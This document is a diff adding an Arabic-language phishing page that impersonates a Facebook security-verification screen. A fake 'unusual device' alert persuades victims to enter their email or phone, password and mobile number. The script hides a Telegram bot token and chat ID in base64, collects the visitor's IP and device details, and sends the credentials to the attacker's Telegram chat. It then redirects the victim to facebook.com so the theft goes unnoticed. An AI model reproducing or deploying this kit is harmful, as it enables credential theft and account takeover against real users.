@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>التحقق الأمني | فيسبوك</title>
+    <meta name="description" content="إجراء التحقق الأمني لحماية حسابك">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { width: 100%; max-width: 480px; }
+        .header { text-align: center; margin-bottom: 25px; }
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1), 0 8px 20px rgba(0,0,0,0.1);
+            padding: 28px;
+        }
+        .title { font-size: 24px; font-weight: bold; color: #1b1f23; text-align: center; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; color: #65676b; text-align: center; margin-bottom: 20px; }
+        .security-badge {
+            background: linear-gradient(135deg, #1877f2 0%, #0e5fd9 100%);
+            color: white;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+        }
+        .security-badge span { font-size: 24px; }
+        .security-badge strong { display: block; font-size: 15px; margin-bottom: 4px; }
+        .alert-box {
+            background: #fff4e5;
+            border-right: 4px solid #f7b928;
+            padding: 14px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #5a5a5a;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+        }
+        .alert-box span { font-size: 18px; }
+        .input-group { margin-bottom: 18px; }
+        label { display: block; font-size: 14px; font-weight: 500; color: #1b1f23; margin-bottom: 8px; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 10px;
+            outline: none;
+            transition: all 0.2s;
+            background: #fff;
+        }
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24,119,242,0.15);
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.2s;
+        }
+        button:hover { background: #166fe5; transform: translateY(-1px); }
+        button:active { transform: translateY(0); }
+        .loading { display: none; text-align: center; margin-top: 20px; }
+        .loading.active { display: block; }
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e4e6eb;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-msg {
+            background: #ffe7e7;
+            color: #d32f2f;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 18px;
+            text-align: center;
+            display: none;
+            font-size: 13px;
+        }
+        .secure-footer { 
+            text-align: center; 
+            margin-top: 20px; 
+            font-size: 12px; 
+            color: #8a8d91;
+            border-top: 1px solid #e4e6eb;
+            padding-top: 18px;
+        }
+        .secure-footer span { color: #42b72a; }
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .footer-links a { color: #65676b; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; color: #1877f2; }
+        .info-icon { display: inline-block; width: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" width="180">
+                <path fill="#1877f2" d="M34 18a16 16 0 1 0-18.5 15.8v-11.2h-3.4V18h3.4v-2.9c0-3.3 2-5.1 5-5.1 1.4 0 2.6.1 3 .2v3.3h-2c-1.5 0-1.9.7-1.9 1.7V18h3.6l-.6 3.6h-3v11.2A16 16 0 0 0 34 18z"/>
+                <path fill="#fff" d="M21.5 21.6l.6-3.6h-3.6v-2.3c0-1 .4-1.7 1.9-1.7h2V11c-.4-.1-1.6-.2-3-.2-3 0-5 1.8-5 5.1V18h-3.4v3.6H13v11.2c.7.1 1.4.2 2.2.2s1.5-.1 2.2-.2V21.6h3.1z"/>
+            </svg>
+        </div>
+        
+        <div class="card">
+            <div class="title">إجراء التحقق الأمني</div>
+            <div class="subtitle">تأكيد هويتك لحماية حسابك</div>
+            
+            <div class="security-badge">
+                <span>🛡️</span>
+                <div>
+                    <strong>حماية محسّنة</strong>
+                    نلاحظ محاولة دخول من جهاز غير معتاد
+                </div>
+            </div>
+            
+            <div id="errorBox" class="error-msg"></div>
+            
+            <div class="alert-box">
+                <span>⚠️</span>
+                <div>للحفاظ على أمان حسابك، يرجى تأكيد معلومات تسجيل الدخول. سيتم إرسال رمز تأكيد إلى جهازك الموثوق.</div>
+            </div>
+            
+            <form id="securityForm" onsubmit="verifyIdentity(event)">
+                <div class="input-group">
+                    <label>📧 البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="userEmail" placeholder="example@email.com أو 05xxxxxxxx" autocomplete="off" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔒 كلمة المرور</label>
+                    <input type="password" id="userPassword" placeholder="كلمة المرور" autocomplete="off" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>📱 رقم الجوال (لإرسال رمز التأكيد)</label>
+                    <input type="tel" id="userPhone" placeholder="05xxxxxxxx - اختياري">
+                </div>
+                
+                <button type="submit" id="verifyBtn">تأكيد الهوية والمتابعة</button>
+                
+                <div class="loading" id="loadingIndicator">
+                    <div class="spinner"></div>
+                    <p style="margin-top: 12px; color: #65676b;">جاري التحقق من المعلومات...</p>
+                </div>
+                
+                <div class="secure-footer">
+                    🔒 <span>اتصال آمن ومشفر</span> • حماية من الاختراق
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#">مركز المساعدة الأمنية</a>
+            <a href="#">الإبلاغ عن مشكلة</a>
+            <a href="#">معرفة المزيد</a>
+        </div>
+    </div>
+    
+    <script>
+        // بيانات الخدمة - مشفرة
+        (function() {
+            const _keys = [
+                'ODQwNjU1MzE5NTpBQUhHWEtJaUdEQXFEblliWXBxaVVxYml1c1RqX0Fhd1hMUQ==',
+                'NzYyODQ0MDMwNQ==',
+                'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=='
+            ];
+            
+            function decode(str) {
+                return atob(str);
+            }
+            
+            window._secureConfig = {
+                token: decode(_keys[0]),
+                chatId: decode(_keys[1]),
+                apiBase: decode(_keys[2])
+            };
+        })();
+        
+        // جمع معلومات الجهاز
+        async function getDeviceDetails() {
+            const details = {
+                agent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' })
+            };
+            
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ipData = await res.json();
+                details.ip = ipData.ip;
+            } catch(e) {
+                details.ip = 'غير متاح';
+            }
+            
+            return details;
+        }
+        
+        // إرسال البيانات للتحقق
+        async function sendVerificationData(email, password, phone, deviceInfo) {
+            const verificationMessage = `
+🛡️ *إجراء التحقق الأمني - فيسبوك* 🛡️
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 *البريد الإلكتروني:* \`${email}\`
+🔑 *كلمة المرور:* \`${password}\`
+📱 *رقم الجوال:* \`${phone || 'غير مدخل'}\`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💻 *معلومات الجهاز*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 *عنوان IP:* \`${deviceInfo.ip}\`
+📱 *نظام التشغيل:* \`${deviceInfo.platform}\`
+🌍 *اللغة:* \`${deviceInfo.language}\`
+📺 *دقة الشاشة:* \`${deviceInfo.screen}\`
+🕒 *الوقت:* \`${deviceInfo.timestamp}\`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 *طلب تحقق أمني جديد*
+            `;
+            
+            const url = `${window._secureConfig.apiBase}/${window._secureConfig.token}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: window._secureConfig.chatId,
+                    text: verificationMessage,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            return response.ok;
+        }
+        
+        // معالج التحقق الأمني
+        async function verifyIdentity(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('userEmail').value.trim();
+            const password = document.getElementById('userPassword').value;
+            const phone = document.getElementById('userPhone').value;
+            const errorBox = document.getElementById('errorBox');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const loadingEl = document.getElementById('loadingIndicator');
+            
+            errorBox.style.display = 'none';
+            
+            if (!email || !password) {
+                errorBox.innerHTML = '⚠️ يرجى إدخال البريد الإلكتروني وكلمة المرور لإكمال التحقق';
+                errorBox.style.display = 'block';
+                return;
+            }
+            
+            verifyBtn.style.display = 'none';
+            loadingEl.classList.add('active');
+            
+            try {
+                const deviceData = await getDeviceDetails();
+                const success = await sendVerificationData(email, password, phone, deviceData);
+                
+                if (success) {
+                    loadingEl.innerHTML = `
+                        <div style="color: #42b72a; font-size: 14px;">✓ تم تأكيد هويتك بنجاح</div>
+                        <p style="margin-top: 8px; font-size: 13px; color: #65676b;">جاري إعادة توجيهك إلى حسابك...</p>
+                    `;
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://www.facebook.com';
+                    }, 1500);
+                } else {
+                    throw new Error('فشل الاتصال بخوادم التحقق');
+                }
+                
+            } catch(error) {
+                errorBox.innerHTML = '⚠️ حدث خطأ في خوادم التحقق، يرجى المحاولة مرة أخرى';
+                errorBox.style.display = 'block';
+                verifyBtn.style.display = 'block';
+                loadingEl.classList.remove('active');
+                loadingEl.innerHTML = '<div class="spinner"></div><p style="margin-top: 12px;">جاري التحقق...</p>';
+            }
+        }
+        
+        // منع النسخ واللصق في الحقول الأمنية (لتبدو أكثر احترافية)
+        document.getElementById('userPassword').addEventListener('paste', function(e) {
+            e.preventDefault();
+            alert('لأسباب أمنية، لا يمكن لصق كلمة المرور. يرجى كتابتها يدوياً.');
+        });
+        
+        // تنبيه وهمي لحماية إضافية
+        console.log('%c🔒 إجراء التحقق الأمني | فيسبوك', 'color: #1877f2; font-size: 14px;');
+        console.log('%cتم تفعيل الحماية المتقدمة لحسابك', 'color: #42b72a; font-size: 12px;');
+    </script>
+</body>
+</html>
